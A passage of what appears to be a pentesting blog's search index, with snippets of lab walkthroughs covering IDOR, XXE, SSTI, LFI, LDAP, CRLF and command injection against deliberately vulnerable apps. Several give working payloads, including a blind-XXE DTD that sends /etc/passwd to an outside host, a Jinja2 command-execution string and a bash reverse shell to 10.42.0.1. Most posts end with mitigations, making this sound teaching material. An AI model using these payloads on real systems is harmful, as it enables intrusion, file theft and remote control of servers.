credentials.Mitigations Use transport-level encryption (SSL/TLS). Use Strict-Transport-SecurityReferences https://portswigger.net/kb/issues/01000200_unencrypted-communications" }, { "title": "Broken Authentication -&gt; Forgot Password - Bad Questions", "url": "/posts/bsf/", "categories": "WebApp And Api Pentesting, Broken Authentication -> Forgot Password - Bad Questions", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Broken Authentication -&amp;gt; Forgot Password - Bad QuestionsA security question is form of shared secret used as an authenticator. It is used as an extra security layer.ExploitationThis webapp has password recovery with bad security questions inwhich the answers can easily be predicted by attacker.We will test the webapp with username webgoat to understand its working flow.As you can see, it was asking for favorite color which is bad question as it can be predicted. Since we have been given red as the favorite color of webgoat user, we will use it here.Now we have understood the working flow of the password recovery, we are going to reset password of admin user.Let’s enter admin as the username.Here, We don’t know the favorite color of admin user but since the security question is easy to guess, we can try different color until we get the right one.Let’s test for redred was incorrect. Let’s try for greenGreat!, we have predicted the answer.References https://cheatsheetseries.owasp.org/cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html https://en.wikipedia.org/wiki/Security_question" }, { "title": "Session hijacking -&gt; Predictable session token", "url": "/posts/bsc/", "categories": "WebApp And Api Pentesting, Session hijacking -> Predictable session token", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Session hijacking : Predictable session tokenSession prediction attack focuses on predicting session ID values that permit an attacker to bypass the authentication schema of an application. By analyzing and understanding the session ID generation process, an attacker can predict a valid session ID value and get access to the application.ExploitationThis webapp uses predictable session token, If we can predict a session token of a user, we will be able to login to his/her account without authentication.Let’s first login to user account with the following credentials user:user.We have logged in as user. Let’s analyse the cookies.As you can see, session id 23 has been assigned to the user. What if we can change the session id to something else, let’s say 1, we can login to an account of other user. Let’s tryWe will refresh the page and see what will happen.We have logged in as admin.Mitigations Implement unpredictable session id (random enough).References https://owasp.org/www-community/attacks/Session_Prediction https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html" }, { "title": "Broken Authentication -&gt; Bruteforce", "url": "/posts/bsb/", "categories": "WebApp And Api Pentesting, Broken Authentication -> Bruteforce", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Broken Authentication : BruteforceA brute force attack uses trial-and-error to guess login info, encryption keys, or find a hidden web page. Hackers work through all possible combinations hoping to guess correctly.ExploitationThis login form does’nt have bruteforce protection which will allow us to bruteforce user’s credentials.There are lot of tools to bruteforce login form but we will use burpsuite intruder here. We will enter an invalid credential test:test, intercept the request in burpsuite, and then forward the request to intruder.For this purpose, we will choose cluster bomb attack type as we are going to bruteforce both username and password, and then load our wordlists in payload section .As you can see, admin:admin gave different status code 302, which means we got valid credential.We will attempt to login with the credential admin:admin.Great!, We have logged in as Admin.Mitigations Account Lockout Policy Use CAPTCHAS Multi-factor Authentication Progressive delaysReferences https://www.kaspersky.com/resource-center/definitions/brute-force-attack https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks" }, { "title": "Broken Access Control -&gt; IDOR -&gt; Order", "url": "/posts/bat/", "categories": "WebApp And Api Pentesting, Broken Access Control -> IDOR -> Order", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Broken Access Control: IDOR -&amp;gt; OrderInsecure Direct Object References (IDOR) occur when an application provides direct access to objects based on user-supplied input. It allows attackers to bypass authorization and access resources directly by modifying the value of a parameter used to directly point to an object. Such resources can be database entries belonging to other users, files in the system, and more.ExploitationThis webapp is vulnerable to idor which allows attacker to buy a tickets without charges.We are going to buy a few tickets and examine the logic flow of the application.Let’s order 1 ticket and see what will happen.As you can see we have been charged 15 EUR , which means each ticket is 15 EUR.Let’s order 2 tickets now.Here we have been charged 30 EUR for 2 tickets. If we examine the logic, we will find out that it was multiplying the number of ordered tickets by 15. 1 * 15 = 15, 2 * 15 = 30 and so on.Let’s order 1000000 tickets and intercept the request in burpsuite.As you can see, the value of ticket_price was 15. Therefore, if we forward the request like this will multiply ticket_quantity by ticket_price, which we will be charged 1000000 * 15 = 15000000 15 million EUR.What if we replace the ticket_price with 0 value? It will calculate the amount as 1000000 * 0 = 0 0 EUR, so we will then be charged 0 EUR for 1000000 tickets.Let’s try this trick.Great!, We have bought 1 million ticket for 0 EUR.References https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References" }, { "title": "Broken Access Control -&gt; IDOR -&gt; Access File", "url": "/posts/bap/", "categories": "WebApp And Api Pentesting, Broken Access Control -> IDOR -> Access File", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Broken Access Control: IDOR -&amp;gt; Access FileInsecure Direct Object References (IDOR) occur when an application provides direct access to objects based on user-supplied input. It allows attackers to bypass authorization and access resources directly by modifying the value of a parameter used to directly point to an object. Such resources can be database entries belonging to other users, files in the system, and more.ExploitationThis webapp has access control flaw that will allow attacker to access internal file of the system i.e /etc/passwd, /etc/hostname… . Let’s choose one file from the list, click on View File button and then intercept the request with burpsuite.As you can see the webapp was taking the name of the file that we chose to view. If it’s vulnerable to idor, we can access other file by replacing the name of the file with the one we want to retrieve.Let’s replace it with ../../../../../../../../../../../../../../../../etc/passwd, which if successful will retrieve the content of /etc/passwd file.We will forward the requestAs you can see, we were able to retrieve content of /etc/passwd file.References https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References" }, { "title": "Broken Access Control -&gt; IDOR -&gt; View Profile", "url": "/posts/bah/", "categories": "WebApp And Api Pentesting, Broken Access Control -> IDOR -> View Profile", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Broken Access Control: IDOR -&amp;gt; View ProfileInsecure Direct Object References (IDOR) occur when an application provides direct access to objects based on user-supplied input. It allows attackers to bypass authorization and access resources directly by modifying the value of a parameter used to directly point to an object. Such resources can be database entries belonging to other users, files in the system, and more.ExploitationThis webapp has access control flaw that will allow attacker to view profile of other users. To exploit this flaw, we need to be authenticated. Therefore, we will login as Tom with password tom.Here we have two buttons, we will click on ViewProfile and then intercept the request in burpsuite so that we can examine the request.As you can see the request had employee_id, which might be the parameter to identify each registered user. For this user, 105 was his id.What if we can replace employee_id of this user with another number? We may end of accessing other user’s profile. Let’s first forward the request without changing the employee_id.Here, we got tom’s profile.Let’s change the employee_id to 104.We will forward the request.Great!, we got Eric’s profile.References https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References" }, { "title": "Broken Access Control -&gt; MFLAC", "url": "/posts/baf/", "categories": "WebApp And Api Pentesting, Broken Access Control -> MFLAC", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Broken Access Control: Missing Function Level Access Control (MFLAC)Missing function level authorization security vulnerability occurs when there are insufficient authorization checks for sensitive request handlers. This common vulnerability allows malicious users to access restricted resources by escalating their permissions at the function level. Missing Function Level Access Control (MFLAC) is similar to IDOR but this time, broken access control is on functions rather than objects.ExploitationThis webapp implements weak access control on a functions, which can be exploited to abuse administrative function Delete to delete user’s account. Delete function is meant to be used by Administrator.Let’s login as Tom with the provided password tom.As you can see we have two functions here, SearchStaff and ViewProfile. Let’s click on SearchStaff and intercept the request in burpsuite.Here, it looks like the value of action which is SearchStaff, is the name of a function to be invoked in the backend. By examining the value, we will notice that it is in Camelcase style and it startswith the verb which reveals the purpose of the function. For example, SearchStaff , startswith verb Search which means the function will search for Staff. If the function was to delete a staff, the value would have been something like DeleteStaff.Let’s click on ViewProfile and intercept the request in burpsuite.As you can see, from the value ViewProfile we will understand that the purpose of the function is to view user’s profile. We will forward the request and see what will can get.Here we have the profile of tom.What if there is a hidden function that can be used to delete user’s profile? If so, then we can be able to predict the name of the function as something like DeleteProfile since all the function use Camelcase style. To test this, we will replace ViewProfile with DeleteProfile and see if we can delete user’s profile.Let’s forward the request.Great!, We were able to use Delete function which was meant to be used by Administrator.References https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control https://blog.detectify.com/2016/07/13/owasp-top-10-missing-function-level-access-control-7/" }, { "title": "XXE - XML External Entity", "url": "/posts/xxe/", "categories": "WebApp And Api Pentesting, XML External Entity", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "XXE - XML External EntityXML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser.This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.Detecting XML External EntityFor the purpose of this experiment, we are going to use bWAPP vulnerable web application. we will click on Any bugs and then intercept the request in our burpsuite.As you can see from the above image, the webapp was using xml to submit data to the server, which is then rendered and displayed on the web page. By examining the response, we will find out that it is rendering and displaying anything in between &amp;lt;login&amp;gt; &amp;lt;/login&amp;gt; .XML ParserTo make sure that it is using xml parser, we will attempt to break an xml syntax on the backend by supplying &amp;gt;&amp;gt;&amp;lt;, this may provide us with xml syntax error.Above image shows an xml syntax error message, implying that the backend is using an xml parser.XML Entity.To determine whether or not XML Entity is enabled, We will supply the following payload, which if successfull will replace bee with our given text, which is xxe.&amp;lt;?xml version=&quot;1.0&quot;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY exploit &quot;xxe&quot;&amp;gt;]&amp;gt; &amp;lt;reset&amp;gt; &amp;lt;login&amp;gt; &amp;amp;exploit; &amp;lt;/login&amp;gt; &amp;lt;secret&amp;gt; Any bugs? &amp;lt;/secret&amp;gt; &amp;lt;/reset&amp;gt;As you can see bee has been replaced with xxe, indicating XMl Entity is enabled.ExploitationReading File /etc/passwdGiven that xml entity is enabled, we can take advantage of it to read internal files such as /etc/passwd, /etc/shadow, /etc/hostname and much more. We will use the following payload.&amp;lt;?xml version=&quot;1.0&quot;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&amp;gt;]&amp;gt; &amp;lt;reset&amp;gt; &amp;lt;login&amp;gt; &amp;amp;file; &amp;lt;/login&amp;gt; &amp;lt;secret&amp;gt; Any bugs? &amp;lt;/secret&amp;gt; &amp;lt;/reset&amp;gt;As you can see, we were able to retrieved content of /etc/passwd.SSRF - Server-side Request ForgeryWe can leverage xxe to conduct ssrf. To do that, we will update our payload in such way that it will send a request to our server i.e python3 -m http.server.&amp;lt;?xml version=&quot;1.0&quot;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY ping SYSTEM &quot;http://[your_host]&quot;&amp;gt;]&amp;gt; &amp;lt;reset&amp;gt; &amp;lt;login&amp;gt; &amp;amp;ping; &amp;lt;/login&amp;gt; &amp;lt;secret&amp;gt; Any bugs? &amp;lt;/secret&amp;gt; &amp;lt;/reset&amp;gt;The below image shows a request has been received from our target.ScanningWe can also conduct a scanning to discover live hosts by examining the time-taken of the response. Our target will take long time to response if our supplied host(ip address ) is down. This will allow us to discover hosts that are alive.&amp;lt;?xml version=&quot;1.0&quot;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY ping SYSTEM &quot;http://[your_host]&quot;&amp;gt;]&amp;gt; &amp;lt;reset&amp;gt; &amp;lt;login&amp;gt; &amp;amp;ping; &amp;lt;/login&amp;gt; &amp;lt;secret&amp;gt; Any bugs? &amp;lt;/secret&amp;gt; &amp;lt;/reset&amp;gt;As you can see we were able to get response immediately, implying that the host is alive.As you can see the response took long time, implying that the host is down.Mitigations Disable DTDs (External Entities) completely.References https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" }, { "title": "Open Redirection", "url": "/posts/unvalidatedredirect/", "categories": "WebApp And Api Pentesting, Open Redirection", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Open RedirectionOpen redirection vulnerabilities arise when an application incorporates user-controllable data into the target of a redirection in an unsafe way. An attacker can construct a URL within the application that causes a redirection to an arbitrary external domain. This behavior can be leveraged to facilitate phishing attacks against users of the application.Detecting Open RedirectionFor the purpose of this experiment, we are going to use bWAPP vulnerable web application. If we click on Beam button, we will be redirected to another domain.We have been redirected to http://itsecgames.blogspot.com/.Now we will intercept the request in our burpsuite in order to examine the flow of redirection.As you can see we have http://itsecgames.blogspot.com/ as the value of url parameter, which means the server is making redirection based on the value of url.ExploitationLet’s attempt to replace the value of url parameter with our own domain to see what will happen.After sending the request to the server, we were redirected to http://cyberkhalid.local.Mitigations Remove the redirection function from the application, and replace links to it with direct links to the relevant target URLs. Maintain a server-side list of all URLs that are permitted for redirection. Instead of passing the target URL as a parameter to the redirector, pass an index into this list.References https://portswigger.net/kb/issues/00500100_open-redirection-reflected https://book.hacktricks.xyz/pentesting-web/open-redirect https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html" }, { "title": "Server-Side Template Injection", "url": "/posts/ssti/", "categories": "WebApp And Api Pentesting, Server-Side Template Injection", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Server-Side Template Injection(SSTI)Server Side Template Injection vulnerabilities (SSTI) occur when user input is embedded in a template in an unsafe manner and results in remote code execution on the serverDetectionThe webapp takes a profile name from the url and then displays it on the page with a welcoming text. Let’s try changing the profile name to exploit and see what will happen.As you can see, we got a welcoming message with our profile name displayed.Let’s fuzz the url to see if we can break something and get an error, or if we can determine some anomality. There are lot of characters that can be used such as { } ; , || &#39; @ / &amp;gt; &amp;lt; $….By supplying { { &amp;lt;, we got an internal server error message. We might be thinking of server-side template engine running in the backend as they are used for dynamic rendering and also they mostly use { } characters in their syntax. Let’s test for server-side template injection.We will supply this payload {2*2} , if we get 22 or 4 as the profile name, then it’s vulnerable to ssti, otherwise we will proceed with another payload as most server-side templating engine has different syntax.As you can see, this was unsuccessfull, Therefore We will proceed with another payload to see what will happen. We will supply { { 2*2 } }.Well, We got 4 as the profile name, which means it’s vulnerable to ssti.IdentificationSince there are lot of server-side templating engine, we need to identify the server-side template engine in use so we can exploit it. The fact that server-side template engines interpret input differently will allow us to distinguish one from another. We will use the below image to determine our engine.By using the above image, since we successfully executed { { 2*2 } }, our engine will be either jinja2 or twig . Let’s supply { { 5*&#39;3&#39; } } to see what will happenAs you can see, we got 33333. this means our engine is jinja2.Let’s test for jinja2 by supplying { { config } }Great!,Our payload was successfull, therefore, we have finally determine our engine which is jinja2.ExploitationWe can supply the below payload to execute shell command.{ { &#39;&#39;.__class__.__mro__[1].__subclasses__()[401](&quot;whoami&quot;, shell=True, stdout=-1).communicate() } }We have executed shell command.References https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection" }, { "title": "Local File Inclusion", "url": "/posts/lfi/", "categories": "WebApp And Api Pentesting, Local File Inclusion", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Local File InclusionLocal file inclusion (also known as LFI) is a vulnerability that allows attacker to includes files that are already locally present on the server i.e /etc/passwd which can lead to something as outputting the contents of the file, but depending on the severity, it can also lead to RCE. The vulnerability occurs due to the use of user-supplied input without proper validation.Detecting Local File InclusionIn the below image, the url of our target is http://192.168.137.78/fileincl/example1.php?page=intro.php, which seems to be taking a file from page parameter i.e intro.php, including it and then displaying it to the user.If we change the value of page parameter to something like this page=exploit.php, it will attempt to include exploit.php and display it, if exploit.php file does not exist, it may throw an error, else it will display the content of exploit.php.From the above image, we can see the error showing no such file or directory, this means exploit.php does not exist.Let’s attempt to include file that is present on the target server. By supplying page=/etc/passwd, it will attempt to include /etc/passwd, since /etc/passwd is present on the server, the content of /etc/passwd will be displayed to the users.As you can seee from the above image, the content of /etc/passwd is displayed. We can now read any file on which we have read permission.Note: Sometimes you need to use this technigue along with directory traversal. for example , instead of just supplying /etc/passwd, you will have to supply ../../../../../../../etc/passwd.Mitigations Avoid passing user-submitted input to any filesystem/framework API. Maintain a white list of files, that may be included by the page, and then use an identifier (for example the index number) to access to the selected file.References https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion https://www.cobalt.io/blog/a-pentesters-guide-to-file-inclusion" }, { "title": "LDAP Injection", "url": "/posts/ldapi/", "categories": "WebApp And Api Pentesting, LDAP Injection", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "LDAP InjectionLDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input.Detecting LDAP InjectionFrom the below image, we have been given a valid credential username: hacker, password: hacker which allowed us to login as user hacker. Well but our aim here is to find a way to login to any account without a valid credential.To do that, let’s replace our credential with username: any, password: any. By Attempting to login with this invalid credential, we get unauthenticated text telling us that our supplied credential is invalid. see the below image.Let’s attempt to predict the ldap query. Since the interface is using username and password to authenticate users, the query may be something like this (&amp;amp;(name=user)(password=pass)), by supplying name=any&amp;amp;password=any, it will be something like (&amp;amp;(name=any)(password=any)).with )By using ), we can determine whether or not the backend is using ldap query. If we supply the following parameters name=)&amp;amp;password=any, the query will be something like (&amp;amp;(name=))(password=any)). If the backend is using ldap query, it will throw an error as ) will break the ldap query.The above image shows an ldap error, this means our backend is using ldap query and our supplied input ) broke the command as we predicted.with %00Given that ) breaks the ldap query, let’s attempt to fix the query using %00, ldap query ignores anything that comes after %00, by supplying the following parameters name=))%00&amp;amp;password=any, the query will be something like (&amp;amp;(name=))%00)(password=any)) , ldap will ignore anything that comes after %00, and the final query will be something like (&amp;amp;(name=)), since this is a valid query, it will be executed without throwing any error.The above image didn’t show the ldap error, this means our supplied input didn’t break the ldap query as we predicted.ExploitationUser LoginBy using * in conjunction with %00, we can login to a user account without valid credential. * is a regex that tells the ldap to match anything, by supplying the following payload name=*))%00&amp;amp;password=any, the ldap will interpret it as something like (&amp;amp;(name=*)) which means to match any name, this will allow us to login to a user account that first matches the query.From the above image, we were able to login as user hacker.Admin LoginWe can also login to other user’s account by changing our previous payload to something like name=a*))%00&amp;amp;password=any, the ldap will interpret it as something like (&amp;amp;(name=a*)) which means to match any name that starts with alphaber a, this will allow us to login to a user account that starts with alphaber aFrom the above image, we were able to login as user admin.Mitigations Escape all variables using the right LDAP encoding function Use a framework (like LINQtoLDAP that escapes automatically.References https://owasp.org/www-community/attacks/LDAP_Injection https://book.hacktricks.xyz/pentesting-web/ldap-injection https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html" }, { "title": "Path traversal", "url": "/posts/directorytraversal/", "categories": "WebApp And Api Pentesting, path traversal", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Path traversalPath traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files.Detecting Path TraversalFor the purpose of this experiment, we are going to use bWAPP vulnerable web application. We will refresh the page and then intercept the request in our burpsuite.As you can see from the above image, The backend was taking the name of the file from the page parameter and displaying it content to the users.In order to determine whether or not the page parameter is vulnerable to path traversal, we will replace the value of page parameter with anything we like. We will use exploit.txt in this case.we received a response saying This file doesn&#39;t exist, This means it would have displayed the content of exploit.txt if it had existed.Let’s give it a file that is available in the server and see what will happen.As you can see from the above image, the content of portal.php file have been displayed on the page.ExploitationWe can take advantage of this vulnerability to read any file on which we have read permission.Here we were able to retrieve content of /etc/passwd.Here we were able to retrieve content of config.inc which revealed the credentials of database.Mitigations The application should validate the user input before processing it. Ideally, the validation should compare against a whitelist of permitted values. After validating the supplied input, the application should append the input to the base directory and use a platform filesystem API to canonicalize the path. It should verify that the canonicalized path starts with the expected base directory. References https://portswigger.net/web-security/file-path-traversal https://owasp.org/www-community/attacks/Path_Traversal" }, { "title": "CRLF Injection", "url": "/posts/crlf/", "categories": "WebApp And Api Pentesting, CRLF Injection", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "CRLF InjectionA Carriage Return Line Feed (CRLF) Injection vulnerability is a type of Server Side Injection which occurs when an attacker inserts the CRLF characters in an input field to deceive the server by making it think that an object has terminated and a new one has begun. This happens when the web application doesn’t sanitize user input for CRLF characters.DetectionThis webapp is vulnerable to crlf injection. By clicking on blog, it will redirect you to http://itsecgames.blogspot.com. Let’s intercept the request in burpsuite and forward it to repeater.By examining the response, we can see it was reflecting back our supplied url in Location header.Let’s replace the url with anything and examine the response. We will be using exploit.As you can see, exploit was reflected back in the response. Therefore, if the webapp is vulnerable to crlf injection, we can exploit it as it’s reflecting back our supplied input in the response.To test for crlf injection, we will supply this payload exploit%0Acrlf. If it’s vulnerable, crlf will be written in a newline in the response. This is because %0A character is a line feed/newline character which if used will force the text to be written in a new line.Great!, crlf appeared in a newline, which means it is vulnerable to crlf injection.ExploitationIf a webapp is vulnerable to crlf injection, we can exploit to achieve : HTTP Response Splitting Log Injection References https://www.acunetix.com/websitesecurity/crlf-injection/ https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a" }, { "title": "Blind Command Injection", "url": "/posts/cmdiblind/", "categories": "WebApp And Api Pentesting, Blind Command Injection", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Blind Command InjectionBlind Command Injection is a cyber attack that involves executing arbitrary commands on a host operating system (OS) but does not return the output from the command within its HTTP response. Blind Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application.Detecting Blind Command InjectionIn the below image, we can see that the web interface takes in ip address, and perform certain operation on the ip address. Since no output is returned, we may not know what is happening with our supplied input in the backend.But we can get command execution if our supplied input is passed to a system shell without being sanitized, anyway , if we attempt to predict, we may write something like this X [ip] or X [ip] X, where X is our unknown command. By suppliying 127.0.0.1, it will be X 127.0.0.1 or X 127.0.0.1 XTime-BasedTime-Based is a technigue of delaying the response time of a target server by sending a command that will make the server to wait for a given time. Using sleep, We make the server to sleep (or wait) for a period of time before sending back a response, this can help us determine whether or not our supplied input is directly executed in a system shell. By suppliying 127.0.0.1;sleep 10;, the command will be something like this X 127.0.0.1;sleep 10; or X 127.0.0.1;sleep 10; X, this will make the backend server to execute two different commands, one is X 127.0.0.1 and the other is sleep 10, this will make the server to sleep for 10 seconds if our supplied input is executed directly in a system shell.From the above image no response is received, this means our supplied input is directly executed in a system shell thereby causing it to wait for 10 seconds.Out-Of-BoundOut-Of-Bound is a technigue that allows you to force the target server into sending request to your controlled server. There are different ways to get this done, using curl, ping, nslookup and so on, By using curl, We can make the server to send an http request to our controlled server, this can help us determine whether or not our supplied input is directly executed in a system shell. By suppliying 127.0.0.1;curl http://controledhttpserver/;, the command will be something like this X 127.0.0.1;curl http://controledhttpserver/; or X 127.0.0.1;curl http://controledhttpserver/; X,this will make the backend server to execute two different commands, one is X 127.0.0.1 and the other is curl http://controledhttpserver/, if our supplied input is executed directly in a system shell, it will make the server to issue http request to our controlled server.receiving http requestRedirection To A FileWe can also determine whether or not our supplied input is directly executed in a system shell by redirecting the output of the executed command to a file that can be accessible from web interface. By supplying this 127.0.0.1;uname -a &amp;gt; /var/www/cmd.txt;, the command will be something like this X 127.0.0.1;uname -a &amp;gt; /var/www/cmd.txt; or X 127.0.0.1;uname -a &amp;gt; /var/www/cmd.txt; X, if our supplied input is executed directly in a system shell, it will create a new cmd.txt file in the root of the server(/var/www/) and redirect the output of the executed command to the file /var/www/cmd.txtWe can access the file by visiting itWe can also read the content of a local file i.e /etc/passwd by supplyig this payload 127.0.0.1;cat /etc/passwd &amp;gt; /var/www/cmd.txt;content of /etc/passwdExploitationGetting Reverse ShellTo get a reverse shell, we used the reverse shell payload below and setup our listener using netcat i.e nc -nlvp [port].bash -c &#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.42.0.1/10000 0&amp;gt;&amp;amp;1&#39;Then supplied the following 127.0.0.1;bash -c &#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.42.0.1/10000 0&amp;gt;&amp;amp;1; to the vulnerable endpoint.receiving reverse shellMitigations Avoid calling OS commands directly, Instead Use Built-in library functions. Escape values added to OS commands specific to each OS Applications should run using the lowest privileges that are required to accomplish the necessary tasks.References https://portswigger.net/web-security/os-command-injection https://owasp.org/www-community/attacks/Command_Injection https://book.hacktricks.xyz/pentesting-web/command-injection https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" }, { "title": "Command Injection", "url": "/posts/cmdi/", "categories": "WebApp And Api Pentesting, Command Injection", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Command InjectionCommand Injection is a cyber attack that involves executing arbitrary commands on a host operating system (OS). Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application.Detecting Command InjectionIn the below image, we can see that the web interface takes in ip address, pings the ip address and then returns the output to the user. By examining the outputs, we will discover that the backend is using ping command to ping a given ip address.We can attempt to predict the os command that is executed, which may be ping -c 3 [ip]. By supplying 127.0.0.1, the command will be something like this ping -c 3 127.0.0.1, we can get command execution If the backend passess the supplied input to a system shell without sanitizing it.with ;We can determine whether or not our supplied input is directly executed in a system shell using ;. By suppliying 127.0.0.1;, the command will be ping -c 3 127.0.0.1;, we will get thesame output if our supplied input is executed directly in a system shell,this is because, ; will not break the command as it is also used to end linux command or to execute nultiple command in one line.The above image shows the output of the executed command, this means our supplied input is directly executed in a system shell and it did’nt break the command as we predicted.with )We can determine whether or not our supplied input is directly executed in a system shell using ). By suppliying 127.0.0.1), the command will be ping -c 3 127.0.0.1), we will not get any output if our supplied input is executed directly in a system shell,this is because, ) will break the linux command completely.The above image didn’t show the output of the executed command, this means our supplied input is directly executed in a system shell and it broke the command as we predicted.ExploitationExecuting uname -aGiven that our supplied input is directly supplied to a system shell without sanitization, we can execute our own command by taking advantage of ;, as it is used to execute multiple system command. By suppliying 127.0.0.1;uname -a;, our command will be something like this ping -c 3 127.0.0.1;uname -a;. This will make the backend server to execute two different commands, one is ping -c 3 127.0.0.1 and the other is uname -aFrom the above image we get the output of the uname -a command, which is highlighted in the image.Getting Reverse ShellTo get a reverse shell, we used the reverse shell payload below and setup our listener using netcat i.e nc -nlvp [port].bash -c &#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.42.0.1/10000 0&amp;gt;&amp;amp;1&#39;Then supplied the following 127.0.0.1;bash -c &#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.42.0.1/10000 0&amp;gt;&amp;amp;1; to the vulnerable endpoint.getting reverse shellMitigations Avoid calling OS commands directly, Instead Use Built-in library functions. Escape values added to OS commands specific to each OS Applications should run using the lowest privileges that are required to accomplish the necessary tasks.References https://portswigger.net/web-security/os-command-injection https://owasp.org/www-community/attacks/Command_Injection https://book.hacktricks.xyz/pentesting-web/command-injection https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" }, { "title": "Blind XML External Entity", "url": "/posts/bxxe/", "categories": "WebApp And Api Pentesting, Blind XML External Entity", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Blind XML External EntityBlind XXE vulnerabilities arise where the application is vulnerable to XXE injection but does not return the values of any defined external entities within its responses. This means that direct retrieval of server-side files is not possible.Detecting Blind XML External EntityThis is a basic login form with username and password, Let’s attempt to supply username and password and intercept the request in our burpsuite.As you can see, we received invalid username and password because our credentials are incorrect.XML ParserLet’s try to find blind xxe vulnerability here, we are going to supply incorrect xml to our target. To do that, we will change the value of Content-Type to text/xml which will look like this Content-Type: text\\xml. This content-type will indicate to the server that we are supplying xml data.We received Invalid XML from the server, this is because we supplied an incorrect xml data username=exploit&amp;amp;password=payload to the server which the xml parser can’t able to process it. This error message proved that the backend is using xml parser to process user’s data.Let’s attempt to fix the error by supplying correct xml data to the server.After supplying correct xml data, we were able to fix the error, proving the backend is using xml parser to process users’s data.XML Entity.To determine whether or not XML Entity is enabled, We will supply the following payload, which if successfull will send a request to our web server.&amp;lt;?xml version=&quot;1.0&quot;?&amp;gt; &amp;lt;!DOCTYPE exploit [ &amp;lt;!ENTITY % ping SYSTEM &quot;http://[your_host]&quot;&amp;gt; %ping;]&amp;gt; &amp;lt;test&amp;gt; redteam &amp;lt;/test&amp;gt; As you can see we were able to receive a response from our target, implying that XML Entity is enabled.ExploitationData ExfiltrationGiven that xml entity is enabled, we can take advantage of it to exfiltrate data from our target server. We will make the server load a new DTD with a malicious payload that will send the content of a file via HTTP request. To do that, we will host our malicous DTD file at port 9090 and use port 90 to receive the exfiltrated data.here is the content of our malicous DTD that will be used to exfiltrate content of /etc/passwd file.&amp;lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&amp;gt;&amp;lt;!ENTITY % eval &quot;&amp;lt;!ENTITY &amp;amp;#x25; exfiltrate SYSTEM &#39;http://10.42.0.1:90/?x=%file;&#39;&amp;gt;&quot;&amp;gt;%eval;%exfiltrate;We will supply the following payload to our target.&amp;lt;?xml version=&quot;1.0&quot;?&amp;gt; &amp;lt;!DOCTYPE exploit [ &amp;lt;!ENTITY % data SYSTEM &quot;http://10.42.0.1:9090/payload.dtd&quot;&amp;gt; %data;]&amp;gt; &amp;lt;test&amp;gt; redteam &amp;lt;/test&amp;gt;The below image shows the content of /etc/passwd has been exfiltrated from the target.Mitigations Disable DTDs (External Entities) completely.References https://portswigger.net/web-security/xxe/blind 